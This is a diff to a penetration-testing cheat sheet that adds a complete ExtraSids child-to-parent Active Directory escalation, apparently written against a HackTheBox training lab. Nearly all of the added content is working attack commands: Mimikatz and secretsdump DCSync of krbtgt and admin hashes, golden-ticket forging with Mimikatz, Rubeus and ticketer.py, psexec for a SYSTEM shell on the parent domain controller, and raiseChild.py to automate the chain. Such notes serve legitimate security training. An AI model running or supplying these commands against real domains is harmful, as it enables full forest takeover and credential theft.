@@ -2337,16 +2337,112 @@ ____________________________________________
 # - [AllowedToDelegate]: Can be abused for Constrained Delegation across trust boundaries.
 # - [Enterprise Admin]: Always the ultimate target in a Forest Root domain.
 ```
-##### Trust Relationships Child Parent Trusts
+##### Trust Relationships Child-Parent Trusts 
 ```
-# PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
-Get-ADTrust -Filter *
+________________________________________________________________________________________
+ExtraSids Attack (Child to Parent Escalation)
+________________________________________________________________________________________
+(Attack Prerequisites & Concepts) 
 
-# PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
-Get-DomainTrust
+# 1. Concept: Exploits the lack of SID Filtering between parent-child domains in the same forest.
+# 2. Key Attribute: sidHistory. We inject the Enterprise Admins SID into this attribute.
+# 3. Goal: Create a Golden Ticket in the Child domain that grants Enterprise Admin rights in the Parent domain.
+# 4. Requirements:
+#    - KRBTGT NT Hash of the Child Domain.
+#    - SID of the Child Domain.
+#    - SID of the "Enterprise Admins" group (Parent Domain).
+#    - A target username (can be fake).
 
-# PowerView tool used to perform a domain trust mapping from a Windows-based host.
-Get-DomainTrustMapping
+========================================================================================
+ExtraSids Attack from Windows
+========================================================================================
+____________________________________________
+(Phase 1: Enumeration & Data Collection)
+____________________________________________
+
+# Step 1: Get Child Domain KRBTGT Hash (Must be Domain Admin in Child first).
+# Using Mimikatz DCSync:
+lsadump::dcsync /user:LOGISTICS\krbtgt /domain:LOGISTICS.INLANEFREIGHT.LOCAL
+
+# Step 2: Get Child Domain SID.
+Get-DomainSID
+
+# Step 3: Get Parent "Enterprise Admins" Group SID.
+# Note: Enterprise Admins always end in RID 519.
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid
+
+____________________________________________
+(Phase 2: Forge & Inject Ticket - Using Mimikatz or Rubeus)
+____________________________________________
+
+(Using Mimikatz)
+# Create and Inject Golden Ticket with ExtraSids (-519).
+kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<Child_SID> /krbtgt:<Child_KRBTGT_Hash> /sids:<Parent_EA_SID> /ptt
+
+or
+
+(Using Rubeus)
+# Same attack using Rubeus (Cleaner and more modern).
+.\Rubeus.exe golden /rc4:<Child_KRBTGT_Hash> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<Child_SID> /sids:<Parent_EA_SID> /user:hacker /ptt
+
+____________________________________________
+(Phase 3: Verification & Takeover)
+____________________________________________
+
+# Check if the ticket is in memory.
+klist
+
+# Access Parent Domain Controller C$ share (Confirms Full Admin).
+ls \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\C$
+
+# Perform DCSync against Parent Domain to dump Domain Admin hashes.
+lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
+
+========================================================================================
+ExtraSids Attack from Linux   (Using Impacket)
+========================================================================================
+
+____________________________________________
+(Phase 1: Data Collection)
+____________________________________________
+
+# 1. Perform DCSync to dump the Child Domain KRBTGT NT Hash.
+# Requires Domain Admin privileges in the Child Domain.
+secretsdump.py LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm@172.16.5.240 -just-dc-user krbtgt
+
+# 2. Enumerate Child Domain SID using SID Brute Forcing.
+lookupsid.py LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm@172.16.5.240 | grep "Domain SID"
+
+# 3. Enumerate Parent Domain SID and Enterprise Admins RID (519).
+# Targeting the Parent Domain Controller directly.
+lookupsid.py LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm@172.16.5.5 | grep -B 12 "Enterprise Admins"
+
+____________________________________________
+(Phase 2: Forge & Inject Ticket)
+____________________________________________
+
+# 1. Forge a Golden Ticket and inject the Parent Enterprise Admin SID into [ExtraSids].
+# This creates a local credential cache file (hacker.ccache).
+ticketer.py -nthash <Child_Hash> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <Child_SID> -extra-sid <Parent_EA_SID> hacker
+
+# 2. Set the Kerberos Environment Variable to use the forged ticket.
+export KRB5CCNAME=hacker.ccache
+
+____________________________________________
+(Phase 3: Final Takeover)
+____________________________________________
+
+# 1. Execute a SYSTEM shell on the Parent Domain Controller.
+# Use [-k] for Kerberos Auth and [-no-pass] since we are using the ccache ticket.
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -k -no-pass
+
+____________________________________________
+(Automate attack with raiseChild.py) (https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+____________________________________________
+
+# NOTE: Automate the entire escalation process with a single command.
+# It performs SID lookup, KRBTGT dumping, ticket forging, and execution automatically.
+raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 ```
 
 ##### Trust Relationships - Cross-Forest
